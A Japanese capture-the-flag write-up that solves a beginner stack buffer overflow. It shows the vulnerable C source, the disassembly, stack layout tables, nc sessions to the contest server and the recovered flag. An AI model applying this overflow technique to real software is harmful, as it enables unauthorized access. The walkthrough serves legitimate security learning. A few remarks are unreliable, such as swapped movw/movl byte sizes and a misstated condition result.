## [Pwn][Easy]simpleoverflow

Cでは、0がFalse、それ以外がTrueとして扱われます。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[10] = {0};
  int is_admin = 0;
  printf("name:");
  read(0, buf, 0x10);
  printf("Hello, %s\n", buf);
  if (!is_admin) {
    puts("You are not admin. bye");
  } else {
    system("/bin/cat ./flag.txt");
  }
  return 0;
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}

```

---
## Solution

```c
  char buf[10] = {0};
  int is_admin = 0;
  printf("name:");
  read(0, buf, 0x10);
  printf("Hello, %s\n", buf);
  if (!is_admin) {
    puts("You are not admin. bye");
  } else {
    system("/bin/cat ./flag.txt");
  }
  return 0;
```

`is_admin`が`0`以外であれば`system("/bin/cat ./flag.txt");`が実行されることがわかる。
`is_admin`を書き換えることができるだろうか。

```bash
objdump -d ./chall
```
逆アセンブルしてみる。


```asm
0000000000401176 <main>:
  401176:       55                      push   %rbp
  401177:       48 89 e5                mov    %rsp,%rbp
  40117a:       48 83 ec 10             sub    $0x10,%rsp
  40117e:       48 c7 45 f2 00 00 00    movq   $0x0,-0xe(%rbp)
  401185:       00 
  401186:       66 c7 45 fa 00 00       movw   $0x0,-0x6(%rbp)
  40118c:       c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%rbp)
  401193:       48 8d 05 6a 0e 00 00    lea    0xe6a(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  40119a:       48 89 c7                mov    %rax,%rdi
  40119d:       b8 00 00 00 00          mov    $0x0,%eax
  4011a2:       e8 a9 fe ff ff          callq  401050 <printf@plt>
  4011a7:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  4011ab:       ba 10 00 00 00          mov    $0x10,%edx
  4011b0:       48 89 c6                mov    %rax,%rsi
  4011b3:       bf 00 00 00 00          mov    $0x0,%edi
  4011b8:       e8 b3 fe ff ff          callq  401070 <read@plt>
  4011bd:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  4011c1:       48 89 c6                mov    %rax,%rsi
  4011c4:       48 8d 05 3f 0e 00 00    lea    0xe3f(%rip),%rax        # 40200a <_IO_stdin_used+0xa>
  4011cb:       48 89 c7                mov    %rax,%rdi
  4011ce:       b8 00 00 00 00          mov    $0x0,%eax
  4011d3:       e8 78 fe ff ff          callq  401050 <printf@plt>
  4011d8:       83 7d fc 00             cmpl   $0x0,-0x4(%rbp)
  4011dc:       75 11                   jne    4011ef <main+0x79>
  4011de:       48 8d 05 30 0e 00 00    lea    0xe30(%rip),%rax        # 402015 <_IO_stdin_used+0x15>
  4011e5:       48 89 c7                mov    %rax,%rdi
  4011e8:       e8 43 fe ff ff          callq  401030 <puts@plt>
  4011ed:       eb 0f                   jmp    4011fe <main+0x88>
  4011ef:       48 8d 05 36 0e 00 00    lea    0xe36(%rip),%rax        # 40202c <_IO_stdin_used+0x2c>
  4011f6:       48 89 c7                mov    %rax,%rdi
  4011f9:       e8 42 fe ff ff          callq  401040 <system@plt>
  4011fe:       b8 00 00 00 00          mov    $0x0,%eax
  401203:       c9                      leaveq 
  401204:       c3                      retq 
```

注目するべきはこの部分。
変数の初期化を行っている。
```
  40117e:  movq  $0x0,-0xe(%rbp) 8byte
  401186:  movw  $0x0,-0x6(%rbp) 4byte
  40118c:  movl  $0x0,-0x4(%rbp) 2byte
```

メモリの配置はこのようになっていると推測。

```text
movq  8byte初期化 buf[0]~buf[7]
movw  2byte初期化 buf[8]~buf[9]
movl  4byte初期化  is_admin[0]~is_admin[3]
```

| Address (rbp) | Variable    | Hex  | ASCII | 状態       | Note                         |
| :------------ | :---------- | :--- | :---- | :--------- | :--------------------------- |
| -0xe (-14)    | buf[0]      | 0x00 | \0    | ゼロ初期化 | movq $0x0, -0xe(%rbp) で一括初期化 |
| -0xd (-13)    | buf[1]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0xc (-12)    | buf[2]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0xb (-11)    | buf[3]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0xa (-10)    | buf[4]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0x9 (-9)     | buf[5]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0x8 (-8)     | buf[6]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0x7 (-7)     | buf[7]      | 0x00 | \0    | ゼロ初期化 |                              |
| -0x6 (-6)     | buf[8]      | 0x00 | \0    | ゼロ初期化 | movw $0x0, -0x6(%rbp) で初期化 |
| -0x5 (-5)     | buf[9]      | 0x00 | \0    | ゼロ初期化 | buf (10Bytes) の終端          |
| -0x4 (-4)     | is_admin[0] | 0x00 | \0    | ゼロ初期化 | movl $0x0, -0x4(%rbp)        |
| -0x3 (-3)     | is_admin[1] | 0x00 | \0    | ゼロ初期化 |                              |
| -0x2 (-2)     | is_admin[2] | 0x00 | \0    | ゼロ初期化 |                              |
| -0x1 (-1)     | is_admin[3] | 0x00 | \0    | ゼロ初期化 |                              |

次にread関数に注目する。
```c
read(0, buf, 0x10);
```
`buf`のサイズ10byteに対して、`0x10(16byte)`を標準入力から受け取っていることがわかる。
これを利用して、`is_admin`の値を書き換えることができそうだ。

まずは9文字＋改行を入力してみる。
```bash
localhost# nc 34.170.146.252 41710
name:123456789
Hello, 123456789

You are not admin. bye

localhost#
```

メモリの配置

| Address (rbp) | Variable | Hex | ASCII | 状態 | Note |
| :--- | :--- | :--- | :--- | :--- | :--- |
| -0xe (-14) | buf[0] | 0x31 | 1 | 入力データ | read で書き込み開始 |
| -0xd (-13) | buf[1] | 0x32 | 2 | 入力データ | |
| -0xc (-12) | buf[2] | 0x33 | 3 | 入力データ | |
| -0xb (-11) | buf[3] | 0x34 | 4 | 入力データ | |
| -0xa (-10) | buf[4] | 0x35 | 5 | 入力データ | |
| -0x9 (-9) | buf[5] | 0x36 | 6 | 入力データ | |
| -0x8 (-8) | buf[6] | 0x37 | 7 | 入力データ | |
| -0x7 (-7) | buf[7] | 0x38 | 8 | 入力データ | |
| -0x6 (-6) | buf[8] | 0x39 | 9 | 入力データ | |
| -0x5 (-5) | buf[9] | 0x0a | \n | 改行コード | buf の枠内（10bytes目）に収まる |
| -0x4 (-4) | is_admin[0] | 0x00 | \0 | 変化なし | 未破壊 |
| -0x3 (-3) | is_admin[1] | 0x00 | \0 | 変化なし | |
| -0x2 (-2) | is_admin[2] | 0x00 | \0 | 変化なし | |
| -0x1 (-1) | is_admin[3] | 0x00 | \0 | 変化なし | |

9文字＋改行では`buf[10]`内に収まっており`is_admin`に影響はない。


次に、10文字＋改行で試してみる。

```bash
localhost# nc 34.170.146.252 41710
name:1234567890
Hello, 1234567890

ctf4b{0n_y0ur_m4rk}

localhost# 
```

Flagが表示された。　

| Address (rbp) | Variable    | Hex  | ASCII | 状態    | Note              |
| :------------ | :---------- | :--- | :---- | :---- | :---------------- |
| -0xe (-14)    | buf[0]      | 0x31 | 1     | 入力データ | read で書き込み開始      |
| -0xd (-13)    | buf[1]      | 0x32 | 2     | 入力データ |                   |
| -0xc (-12)    | buf[2]      | 0x33 | 3     | 入力データ |                   |
| -0xb (-11)    | buf[3]      | 0x34 | 4     | 入力データ |                   |
| -0xa (-10)    | buf[4]      | 0x35 | 5     | 入力データ |                   |
| -0x9 (-9)     | buf[5]      | 0x36 | 6     | 入力データ |                   |
| -0x8 (-8)     | buf[6]      | 0x37 | 7     | 入力データ |                   |
| -0x7 (-7)     | buf[7]      | 0x38 | 8     | 入力データ |                   |
| -0x6 (-6)     | buf[8]      | 0x39 | 9     | 入力データ |                   |
| -0x5 (-5)     | buf[9]      | 0x30 | 0     | 入力データ | buf (10bytes) の上限 |
| -0x4 (-4)     | is_admin[0] | 0x0a | \n    | 上書き   | 11bytes目の改行コードが浸食 |
| -0x3 (-3)     | is_admin[1] | 0x00 | \0    | 変化なし  |                   |
| -0x2 (-2)     | is_admin[2] | 0x00 | \0    | 変化なし  |                   |
| -0x1 (-1)     | is_admin[3] | 0x00 | \0    | 変化なし  |                   |


改行が`is_admin` を侵食した結果、`if (!is_admin)` が`True`となり、`system("/bin/cat ./flag.txt")`が実行され、flagが表示された。

---

## Flag

```
ctf4b{0n_y0ur_m4rk}
```